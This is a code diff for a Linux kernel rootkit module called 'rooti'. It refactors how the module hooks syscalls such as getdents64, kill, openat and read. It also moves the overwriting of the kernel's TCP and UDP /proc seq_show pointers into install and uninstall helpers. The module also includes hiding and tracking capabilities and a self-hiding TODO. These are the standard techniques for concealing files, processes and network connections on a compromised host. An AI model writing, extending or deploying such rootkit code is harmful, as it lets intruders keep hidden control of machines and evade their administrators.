@@ -5,13 +5,13 @@
 #include <linux/string.h>
 #include <linux/uaccess.h>
 #include <linux/dirent.h>
-#include <linux/seq_file.h>
 #include <net/sock.h>
 #include <net/tcp.h>
 #include "hooking/utils.h"
 #include "hooking/init.h"
 #include "hooking/syscall.h"
 #include "hooking/func.h"
+#include "hooking/ops.h"
 #include "capabilities/track.h"
 #include "capabilities/rig.h"
 #include "capabilities/hide.h"
@@ -233,7 +233,7 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
 }
 
 // List of system calls to hook :D
-struct rooti_func_hook hooks[] = {
+struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_openat"), hook_openat, &orig_openat),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_close"), hook_close, &orig_close),
@@ -241,6 +241,11 @@ struct rooti_func_hook hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_read"), hook_read, &orig_read),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64)
+};
+
+struct rooti_seq_ops_hook seq_ops_hooks[] = {
+    ROOTI_OPS_HOOK("tcp4_seq_ops", ROOTI_SEQ_SHOW, hook_tcp4_seq_show, &orig_tcp4_seq_show),
+    ROOTI_OPS_HOOK("udp_seq_ops", ROOTI_SEQ_SHOW, hook_udp4_seq_show, &orig_udp4_seq_show)
 };
 
 /* LKM initialization */
@@ -255,25 +260,17 @@ static int __init rooti_init(void)
     }
 
     // Install hooks :D
-    ret = rooti_install_func_hooks(hooks, ARRAY_SIZE(hooks));
+    ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     if (ret < 0) {
         printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
         return ret;
     }
 
-    struct seq_operations *seq_ops;
-
-    rooti_unprotect_memory();
-
-    seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
-    orig_tcp4_seq_show = seq_ops->show;
-    seq_ops->show = hook_tcp4_seq_show;
-
-    seq_ops = (struct seq_operations *)__kallsyms_lookup_name("udp_seq_ops");
-    orig_udp4_seq_show = seq_ops->show;
-    seq_ops->show = hook_udp4_seq_show;
-
-    rooti_protect_memory();
+    ret = rooti_install_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
+    if (ret < 0) {
+        printk(KERN_DEBUG "rooti: rooti_install_seq_ops_hooks() failed: %d\n", ret);
+        return ret;
+    }
 
     // TODO: at some point rooti_hideme() should be called on init
 
@@ -284,7 +281,8 @@ static int __init rooti_init(void)
 static void __exit rooti_exit(void)
 {
     printk(KERN_INFO "rooti: exit\n");
-    rooti_uninstall_func_hooks(hooks, ARRAY_SIZE(hooks));
+    rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
+    rooti_uninstall_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
 
     struct rooti_tracked_fd *record;
     struct rooti_tracked_fd *tmp;
@@ -295,18 +293,6 @@ static void __exit rooti_exit(void)
             rooti_untrack_fd(record);
         }
     }
-
-    struct seq_operations *seq_ops;
-
-    rooti_unprotect_memory();
-
-    seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
-    seq_ops->show = orig_tcp4_seq_show;
-
-    seq_ops = (struct seq_operations *)__kallsyms_lookup_name("udp_seq_ops");
-    seq_ops->show = orig_udp4_seq_show;
-
-    rooti_protect_memory();
 }
 
 module_init(rooti_init);
